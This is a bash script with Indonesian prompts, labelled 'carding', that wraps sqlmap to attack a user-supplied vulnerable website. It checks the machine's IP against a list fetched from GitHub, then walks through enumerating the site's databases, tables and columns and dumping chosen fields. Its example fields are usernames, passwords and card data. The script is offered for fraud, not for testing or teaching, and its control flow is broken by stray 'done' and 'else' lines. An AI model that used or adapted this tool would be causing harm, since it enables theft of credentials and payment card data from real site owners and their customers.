#!/bin/bash

if [[ $USER != "root" ]]; then
	echo "Maaf, Anda harus menjalankan ini sebagai root"
	exit
fi

# initialisasi var
export DEBIAN_FRONTEND=noninteractive
OS=`uname -m`;
MYIP=$(wget -qO- ipv4.icanhazip.com);
MYIP2="s/xxxxxxxxx/$MYIP/g";
ether=`ifconfig | cut -c 1-8 | sort | uniq -u | grep venet0 | grep -v venet0:`
if [[ $ether = "" ]]; then
        ether=eth0
fi

#vps="zvur";
vps="aneka";

#if [[ $vps = "zvur" ]]; then
	#source="http://"
#else
	source="https://raw.githubusercontent.com/elangoverdosis/deeniedoank"
#fi

# go to root
cd

# check registered ip
wget -q -O IP $source/debian7/IP.txt
if ! grep -w -q $MYIP IP; then
	echo "Maaf, hanya IP yang terdaftar yang bisa menggunakan script ini!"
	if [[ $vps = "zvur" ]]; then
		echo "Hubungi: editor ( elang overdoasis atau deeniedoank)"
	else
		echo "Hubungi: editor ( elang overdoasis atau deeniedoank)"
	fi
	rm -f /root/IP
	exit
fi

# carding
cd /root
cd sqlmap
read -p "Masukkan Link atau Web Yang Error (VULN): " cardinger
./sqlmap.py -u $cardinger --dbs
                echo ""
		echo "1) Lanjut"
		echo "2) Keluar (Jika GAGAL)"
		echo ""
		read -p "Pilih salah satu pilihan [1-2]: " option
		case $option in
			1)
			echo  ""
			;;
			2) exit
			;;
		esac
		done
		else
read -p "Ketikkan Table Yang Akan Di Buka: " tabled
./sqlmap.py -u $cardinger -D $tabled --tables
read -p "Ketikkan Column Yang Akan Di Buka: " columed
./sqlmap.py -u $cardinger -D $tabled -T $columed --columns
echo "Contoh: UserName,UserPass,Card (Pisahkan Dengan Koma)"
read -p "Ketikkan Nama Data Yang Mau Di Ambil: " dataed
./sqlmap.py -u $cardinger -D $tabled -T $columed -C $dataed --dumps
echo "SEKIAN SEMOGA SUKSES BOSS!!!"
